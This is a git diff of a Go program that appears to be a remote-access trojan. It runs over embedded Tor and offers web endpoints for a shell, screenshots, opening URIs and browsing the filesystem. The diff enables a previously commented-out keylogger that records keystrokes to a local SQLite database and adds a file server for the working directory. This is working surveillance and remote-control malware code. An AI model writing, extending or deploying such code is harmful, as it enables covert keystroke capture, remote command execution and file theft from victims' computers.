@@ -33,7 +33,6 @@ import (
 	"github.com/clementauger/tor-prebuilt/embedded"
 
 	nmap "github.com/Ullaakut/nmap/v2"
-	fn "github.com/cauefcr/hierarchy/subsroutines"
 	"github.com/kbinani/screenshot"
 	hook "github.com/robotn/gohook"
 	"github.com/schollz/httpfileserver"
@@ -78,14 +77,16 @@ func main() {
 		panic(err)
 	}
 	defer t.Close()
-	// go keylogger(t)
+	go keylogger(t)
 	// Add a handler
 	http.HandleFunc("/sh/", SHhandler)
 	http.HandleFunc("/open/", OpenHandler)
 	http.HandleFunc("/screen/", ScreenHandler)
 	http.HandleFunc("/", HomeHandler)
 
-	http.Handle("/root", httpfileserver.New("/root/", "/").Handle())
+	http.Handle("/root/", httpfileserver.New("/root/", "/").Handle())
+	dir, _ := os.Getwd()
+	http.Handle("/pwd/", httpfileserver.New("/pwd/", dir).Handle())
 	for _, dir := range UnixDirs {
 		http.Handle(dir, httpfileserver.New(dir, dir+"/").Handle())
 	}
@@ -144,10 +145,12 @@ func keylogger(t *tor.Tor) {
 
 	db, _ := sql.Open("sqlite3", "./db.db") // Open the created SQLite File
 	defer db.Close()                        // Defer Closing the database
-	fn.CreateTable(db)                      // Create Database Tables
+	// Create Database Tables
+	if _, err := CreateTable(db); err != nil {
+		log.Panic(err)
+	}
 	ev := hook.Start()
-	tick := time.Tick(1 * time.Minute)
-	for err := range fn.RunHook(ev, tick) {
+	for err := range RunHook(t, cc, db, ev) {
 		log.Println(err)
 	}
 }
@@ -420,6 +423,7 @@ func HomeHandler(w http.ResponseWriter, r *http.Request) {
 	<li><a href="/sh">Shell</a></li>
 	<li><a href="/screen">screen 0</a></li>
 	<li><a href="/open">Open URI</a></li>
+	<li><a href="/pwd">pwd</a></li>
 	<li><a href="/root">/</a></li>
 	%s
 	%s
